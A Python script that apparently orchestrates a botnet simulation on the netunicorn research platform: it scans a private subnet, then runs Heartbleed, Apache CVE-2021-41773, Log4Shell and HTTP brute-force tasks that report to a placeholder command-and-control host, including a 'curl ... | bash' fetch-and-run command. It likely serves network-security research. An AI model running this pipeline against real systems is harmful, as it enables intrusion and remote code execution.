import os

import cloudpickle

from netunicorn.base.experiment import Experiment
from netunicorn.base.pipeline import Pipeline
from netunicorn.client.remote import RemoteClient

from .various_tasks import botnet_tasks

cloudpickle.register_pickle_by_value(botnet_tasks)
attacker_pipeline = Pipeline()
attacker_pipeline.then(botnet_tasks.DetectHosts(network="192.168.0.0/24", dump_filename="hosts.txt"))
attacker_pipeline.then(botnet_tasks.Detect443Port(hosts_filename="hosts.txt"))
attacker_pipeline.then([
    botnet_tasks.CVE20140160(
        hosts_filename="hosts.txt",
        cc_address="https://some.cc.node:5000/heartbleed_endpoint"
    ),
    botnet_tasks.CVE202141773(
        hosts_filename="hosts.txt",
        command="curl https://some.cc.node:5000/773_endpoint/script.sh | bash"
    ),
    botnet_tasks.CVE202144228(
        hosts_filename="hosts.txt",
        cc_address="some.cc.node:5000/log4j_endpoint"
    ),
    botnet_tasks.PatatorHTTP(
        hosts_filename="hosts.txt",
        cc_address="https://some.cc.node:5000/patator_endpoint",
    )
])

client = RemoteClient(
    endpoint=os.environ['UNICORN_ENDPOINT'],
    login=os.environ['UNICORN_LOGIN'],
    password=os.environ['UNICORN_PASSWORD']
)

minion_pool = client.get_minion_pool()

experiment = Experiment().map(minion_pool, attacker_pipeline)

experiment_label = 'botnet-0.1.1'
client.prepare_experiment(experiment, experiment_label)
client.start_execution(experiment_label)
